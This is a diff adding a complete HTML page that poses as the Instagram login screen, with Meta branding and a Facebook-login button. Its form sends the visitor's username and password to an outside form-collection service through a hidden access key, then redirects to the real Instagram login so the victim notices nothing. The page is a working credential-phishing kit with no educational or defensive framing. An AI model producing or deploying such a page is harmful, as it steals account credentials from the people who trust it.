@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="shortcut icon" type="I- icon" href="Instagram_icon.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body>
+    
+     <div class="login-container">
+            <p2>English(UK)<br>          </p2>
+        <img src="https://fontmeme.com/images/instagram-new-logo.png" id="img" style="width: 210px; height: 90px;" class="img">
+        
+        <button class="facebook-login"><i class="fa-brands fa-square-facebook" ></i> Continue Using Facebook</button>
+        <div class="divider">OR</div>
+        <form action="https://api.web3forms.com/submit" method="POST">
+
+            <input type="hidden" name="access_key" value="4cfa50d8-3e47-435f-8d2a-345b2ea259e9">
+        
+            <input type="text" name="name" placeholder="Phone number,username or email address" required>
+            <input type="password" name="pas" placeholder="password" required>
+            <input type="hidden" name="redirect" value="https://www.instagram.com/accounts/login/">
+            <button type="submit"  class="login-btn">Log in</button>
+            <a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="forgot-password">Forgot password?</a>        
+        </form>
+        
+        <div class="signup">
+            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+        </div>
+    </div><hr>
+    <footer>
+        <p> from <span class="meta"><br>   <i class="fa-brands fa-meta"></i>Meta</span></p>
+        
+    </footer>
+    
+</body>
+</html>
